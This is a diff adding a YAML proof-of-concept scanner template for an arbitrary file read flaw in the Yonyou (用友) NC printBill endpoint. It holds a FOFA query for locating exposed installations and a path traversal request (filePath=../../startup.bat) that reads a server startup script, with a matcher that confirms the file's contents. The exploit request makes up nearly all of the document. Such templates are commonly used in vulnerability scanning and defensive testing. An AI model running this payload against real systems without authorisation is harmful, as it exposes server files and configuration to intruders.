@@ -1,0 +1,15 @@
+id: poc-yaml-yongyou-nc-printbill-anyfile-read
+info:
+  name: 用友 NC printBill 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+requests:
+- method: GET
+  path: /portal/pt/printpdf/printBill?pageId=login&filePath=../../startup.bat
+  expression: status_code == 200 && contains(content_type,"application/pdf") && contains(body,"NC_HOME")
+    && contains(body,".bat") && contains(body,"@echo off")
+variables: {}
+transport: http
